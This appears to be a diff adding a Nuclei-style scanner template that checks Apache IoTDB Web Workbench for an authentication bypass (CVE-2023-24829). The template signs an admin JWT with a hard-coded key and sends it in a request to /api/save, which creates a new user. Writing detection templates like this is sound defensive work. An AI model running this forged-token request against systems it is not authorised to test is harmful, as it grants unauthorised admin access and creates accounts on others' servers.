@@ -1,0 +1,41 @@
+id: apache-iotdb-web-workbench-auth-bypass
+info:
+  name: Apache IoTDB Web Workbench Authentication Bypass (CVE-2023-24829)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-24829,authorization-bypass
+
+variables:
+  t1: "{{rand_text_alphanumeric(6)}}"
+  t2: "{{rand_text_alphanumeric(6)}}"
+  r_key: |
+    HSyJ0eXAiOiJKV1QasdfffffffSd3g8923402347523fffasdfasgwaegwaegawegawegawegawetwgewagagewasdf23r23DEEasdfawef134t2fawt2g325gafasdfasdfiLCJhbGciOiJIUzI1NiJ9
+  r_token: "{{generate_jwt('{\"sub\":\"0\",\"userId\":1,\"name\":\"admin\"}', 'HS256', r_key)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/save"
+    headers:
+      Content-Type: application/json
+      Authorization: "{{r_token}}"
+    body: |
+      {"name":"{{t1}}","password":"{{t2}}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"message\":\"Save successful\""
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: word
+        part: header
+        words:
+          - "application/json"
